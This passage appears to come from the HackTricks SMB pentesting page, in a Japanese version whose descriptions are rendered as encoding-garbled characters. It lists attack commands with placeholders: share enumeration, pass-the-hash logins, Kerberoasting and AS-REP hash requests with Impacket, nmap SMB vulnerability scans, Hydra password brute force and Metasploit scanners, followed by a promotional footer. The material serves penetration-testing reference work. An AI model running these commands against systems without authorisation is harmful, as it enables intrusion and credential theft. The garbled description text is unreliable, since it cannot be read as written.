èªè¨¼æƒ…å ±ã‚ã‚Šã§
smbmap -H {IP} -u {Username} -p {Password}
smbclient "\\\\{IP}\\\" -U {Username} -W {Domain_Name} -l {IP}
smbclient "\\\\{IP}\\\" -U {Username} -W {Domain_Name} -l {IP} --pw-nt-hash `hash`
crackmapexec smb {IP} -u {Username} -p {Password} --shares
GetADUsers.py {Domain_Name}/{Username}:{Password} -all
GetNPUsers.py {Domain_Name}/{Username}:{Password} -request -format hashcat
GetUserSPNs.py {Domain_Name}/{Username}:{Password} -request

https://book.hacktricks.xyz/pentesting/pentesting-smb

Entry_2:
Name: Enum4Linux
Description: ä¸€èˆ¬çš„ãªSMBã‚¹ã‚­ãƒ£ãƒ³
Command: enum4linux -a {IP}

Entry_3:
Name: Nmap SMBã‚¹ã‚­ãƒ£ãƒ³1
Description: Nmapã‚’ä½¿ç”¨ã—ãŸSMBè„†å¼±æ€§ã‚¹ã‚­ãƒ£ãƒ³
Command: nmap -p 139,445 -vv -Pn --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse {IP}

Entry_4:
Name: Nmap SMBã‚¹ã‚­ãƒ£ãƒ³2
Description: Nmapã‚’ä½¿ç”¨ã—ãŸSMBè„†å¼±æ€§ã‚¹ã‚­ãƒ£ãƒ³ï¼ˆã‚ˆã‚Šä¸€èˆ¬çš„ï¼‰
Command: nmap --script 'smb-vuln*' -Pn -p 139,445 {IP}

Entry_5:
Name: Hydraãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹
Description: ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒå¿…è¦ã§ã™
Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} {IP} smb

Entry_6:
Name: SMB/SMB2 139/445ã‚³ãƒ³ã‚½ãƒ¼ãƒ«ãƒ¬ã‚¹MFSåˆ—æŒ™
Description: msfconsoleã‚’å®Ÿè¡Œã™ã‚‹å¿…è¦ãŒãªã„SMB/SMB2 139/445åˆ—æŒ™
Note: https://github.com/carlospolop/legionã‹ã‚‰æä¾›ã•ã‚ŒãŸã‚‚ã®
Command: msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS {IP}; set RPORT 139; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb2; set RHOSTS {IP}; set RPORT 139; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS {IP}; set RPORT 445; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb2; set RHOSTS {IP}; set RPORT 445; run; exit'
```

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
